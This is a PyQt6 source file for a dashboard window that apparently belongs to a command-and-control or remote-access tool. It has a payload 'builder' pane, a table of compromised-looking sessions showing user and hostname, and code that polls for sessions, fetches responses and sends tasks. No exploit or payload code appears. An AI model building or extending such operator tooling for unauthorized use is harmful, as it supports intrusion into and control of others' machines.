# ui/dashboard_window.py (Reworked for API Client)
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QSplitter, QTableWidget, QVBoxLayout, 
                             QLabel, QHeaderView, QTableWidgetItem,
                             QPushButton)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from PyQt6.QtGui import QFont
from .builder_pane import BuilderPane
from .options_pane import OptionsPane

class DashboardWindow(QWidget):
    build_requested = pyqtSignal(dict)
    sign_out_requested = pyqtSignal()
    setting_changed = pyqtSignal(str, object)
    session_interact_requested = pyqtSignal(str, dict)
    response_received = pyqtSignal(str, dict)

    def __init__(self, api_client, db_manager, username):
        super().__init__()
        self.api = api_client
        self.db = db_manager
        self.username = username
        self.sessions = {} # This will now store the full vault data

        main_layout = QHBoxLayout(self)
        self.splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(self.splitter)

        self.builder_pane = BuilderPane(self.db)
        self.builder_pane.build_requested.connect(self.build_requested)
        
        sessions_pane = QWidget()
        sessions_layout = QVBoxLayout(sessions_pane)
        sessions_layout.setContentsMargins(10,10,10,10)
        sessions_layout.addWidget(QLabel("<h2>SESSIONS</h2>"))
        
        self.session_table = QTableWidget()
        self.session_table.setColumnCount(5)
        self.session_table.setHorizontalHeaderLabels(["Status", "User", "Host Name", "Session ID", "Open"])
        self.session_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.session_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        
        header = self.session_table.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed); header.resizeSection(0, 120)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Fixed); header.resizeSection(4, 120)
        
        self.session_table.verticalHeader().setVisible(False)
        self.session_table.setSortingEnabled(True)
        
        sessions_layout.addWidget(self.session_table)
        
        self.options_pane = OptionsPane(self.db)
        self.options_pane.sign_out_requested.connect(self.sign_out_requested)
        self.options_pane.setting_changed.connect(self.setting_changed)
        
        self.splitter.addWidget(self.builder_pane); self.splitter.addWidget(sessions_pane); self.splitter.addWidget(self.options_pane)
        self.splitter.setSizes([400, 800, 250])

        self.poll_timer = QTimer(self)
        self.poll_timer.timeout.connect(self.poll_for_updates)
        self.start_polling()

    def start_polling(self):
        self.load_initial_data()
        self.poll_timer.start(5000) # Poll every 5 seconds

    def stop_polling(self):
        self.poll_timer.stop()
        
    def load_initial_data(self):
        response = self.api.get_all_vault_data(self.username)
        if response and response.get("success"):
            self.sessions = response.get("data", {})
            self.poll_for_updates() # Run once to get initial online status

    def poll_for_updates(self):
        # Poll for live session statuses
        live_response = self.api.discover_sessions(self.username)
        if live_response and 'sessions' in live_response:
            live_sessions = live_response['sessions']
            all_sids = set(self.sessions.keys()) | set(live_sessions.keys())
            
            needs_update = False
            for sid in all_sids:
                current_status = self.sessions.get(sid, {}).get('status', 'Offline')
                new_status = 'Online' if sid in live_sessions else 'Offline'
                if current_status != new_status:
                    if sid not in self.sessions: # A new session we've never seen
                        self.sessions[sid] = {'metadata': live_sessions[sid]}
                    self.sessions[sid]['status'] = new_status
                    needs_update = True
            
            if needs_update:
                self.update_session_table()
        
        # Poll for responses for all our sessions
        for session_id in self.sessions.keys():
            response_data = self.api.get_responses(self.username, session_id)
            if response_data and response_data.get("responses"):
                for res in response_data["responses"]:
                    self.response_received.emit(session_id, res)

    def send_task_from_session(self, session_id, task):
        self.api.send_task(self.username, session_id, task)

    def update_session_table(self):
        self.session_table.setSortingEnabled(False)
        self.session_table.setRowCount(0)
        
        for row, (session_id, data) in enumerate(self.sessions.items()):
            self.session_table.insertRow(row)
            self.session_table.setRowHeight(row, 55)

            status = data.get('status', 'Offline')
            status_button = QPushButton(status.upper())
            status_button.setObjectName("StatusButton")
            status_button.setProperty("status", "online" if status == "Online" else "offline")
            status_button.setEnabled(False)
            
            container = QWidget(); layout = QHBoxLayout(container)
            layout.addWidget(status_button); layout.setAlignment(Qt.AlignmentFlag.AlignCenter); layout.setContentsMargins(5,5,5,5)
            self.session_table.setCellWidget(row, 0, container)
            
            metadata = data.get('metadata', {})
            user_item = QTableWidgetItem(metadata.get('user', 'N/A'))
            hostname_item = QTableWidgetItem(metadata.get('hostname', 'N/A'))
            session_id_item = QTableWidgetItem(session_id)
            
            for item in [user_item, hostname_item, session_id_item]:
                item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            
            self.session_table.setItem(row, 1, user_item)
            self.session_table.setItem(row, 2, hostname_item)
            self.session_table.setItem(row, 3, session_id_item)
            
            interact_button = QPushButton("Interact")
            interact_button.setObjectName("InteractButton")
            interact_button.clicked.connect(lambda chk, sid=session_id: self.session_interact_requested.emit(sid, self.sessions.get(sid, {})))
            self.session_table.setCellWidget(row, 4, interact_button)
        
        self.session_table.setSortingEnabled(True)